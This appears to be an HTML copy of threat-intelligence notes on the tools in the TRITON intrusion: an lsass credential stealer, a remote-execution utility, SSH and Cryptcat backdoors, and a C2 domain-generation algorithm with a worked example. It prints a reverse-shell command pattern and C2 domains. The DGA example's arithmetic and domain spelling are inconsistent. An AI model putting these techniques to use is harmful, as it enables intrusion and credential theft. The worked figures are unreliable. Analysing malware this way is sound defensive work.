<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Tools</title>
</head><body>https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/TRITON_Appendix_B.pdf<br/>
<br/>
<b>SecHack</b>&nbsp;(KB77846376.exe) is a credential theft utility that can extract passwords on 32-and 64-bit Windows operating systems from the memory of lsass.exe, similar to the Mimikatz sekurlsa::logonpasswords module::command.<br/>
The tool queries the following authentication packages:<ul><li>msv1_0</li>
<li>kerberos</li>
<li>wdigest</li>
<li>tspkg</li>
</ul>
•SecHack accepts two optional parameters to query for additional data: "cert," "info," or both.<ul><li>cert collects the following certificate information: store, subdir, name, container, provider, keyspec, key size, key exportable, pfx.</li>
<li>info collects the following system information: operating system version and full version, Product Name, Processor Architecture, UAC Admin flags, Current Process Attributes.</li>
</ul>
<br/>
<b>NetExec</b>&nbsp;is a utility to execute a command or program on a remote system. The malware does not contain a persistence mechanism. <br/>
•NetExec can:<ul><li>Execute remote files</li>
<li>Upload files from local machine to remote machine and execute</li>
<li>Open a remote command shell</li>
<li>Open a remote PowerShell instance</li>
<li>Copy itself to a remote machine</li>
</ul>
•When instructed to execute with --cmd or –ps, this sample copies an embedded runsvc.exe to thetarget system. This sample then executes the newly copied file. The embedded executable is an interactive application and runs either "cmd.exe" or "powershell.exe.<ul><li>"%WINDIR%\&lt;System32/SysWOW64&gt;\wbem\xml\runsvc.exe (MD5: 1904cad4927541e47d453becbd934bf0)•Runsvc.exe leverages randomly named pipes to communicate with netsvc.exe</li>
</ul>
<br/>
<b>Cryptcat</b>-Based Backdoor Component<br/>
• compattelprerunner.exe (MD5: 35F443608FC4EEB78F9347A9DFC5AEA1) Compiled 2017-04-25 12:06:07<br/>
compattelprerunner.exeis a C2domain name generator (DNG) that performs a DNS query for a generated hostname and launches an external program using the resolved IP address as an argument.<br/>
• When the malware launches, it performs a DNS query for the domain names "upd-%d.mooo.com" and "%d-srv.net." The format string %d is replaced with a value based on the current date. The DNS server the malware uses is "8.8.8.8."<br/>
• The algorithm for calculating the %d number is calculated by taking the date, month, and [year –116]. Note that the year is captured using the "_localtime64" function. This function returns the year as a number incremented from 1900. Therefore, subtracting 116 means the current year is based on the year 2016. This is a possible indication when this DGA code was first authored.<br/>
&nbsp;&#09;1/30/2018, therefore, becomes 3012. This is the [day][month][number of years since 2016]. This number is multiplied times itself, resulting in the value 9072144. So, the domain used for 1/30/2018 are "udp-9072144.mooo.com" and "9072144-srv.net."<br/>
• The malware creates two processes using the format string "cryptsvc.exe -e cmd %S 443." %S is replaced with the IP address returned from the two DNS queries for the generated domain names.<br/>
<br/>
<b>PLINK</b>-Based Backdoor Component<br/>
•napupdatedb.exe(MD5: BA51F25DB03A66C658D1FD4396F32843) Compiled 2017-04-25 12:06:07<br/>
napupdatedb.exeis a modified PLINK (PUTTY) executable. This SSH-based backdoor initiates a reverse tunnel with embedded credentials to local port 3389, making RDP available on the attacker-controlled server over TCP port 8531.<br/>
•This sample contains a list of C2servers and credentials to tunnel traffic. The embedded configuration is a ";"separated list of command-line arguments passing directly to PLINK.<br/>
&nbsp;&#09;The malware replaces the"*"character of each C2domain with the six-digit local time on the infected system.<br/>
<br/>
<b>OpenSSH</b>-Based Backdoor<br/>
spl32.exe is a modified and custom-compiled version of the sshd.exe from OpenSSH. When launched from a command line, spl32.exe listens on TCP port 50501. It was designed to be a self-contained executable with OpenSSL library built-in and no additional system dependencies. <br/>
•spl32.exe sample deviates from the original sshd.exe by having a fixed configuration and three hard-coded cryptokey pairs. <br/>
&nbsp;&#09;This backdoor included the WinSAT.exe component, an unmodified but custom-compiled version of sftp-server.exe from OpenSSH.<br/>
&nbsp;&#09;WinSAT is launched by spl32.exe when an inbound sftp connection is made and accepted by spl32.exe.<br/>
<br/>
<b>Bitvise</b>-Based Backdoor<br/>
Bitvise is frequently used for file transfer and can achieve high transmission speeds through the SFTP subcomponent. It has an obfuscation option that,when supported and enabled in both the client and server, makes it more difficult for an observer to detect that the protocol being used is SSH<br/>
<br/>
<br/>
</body></html>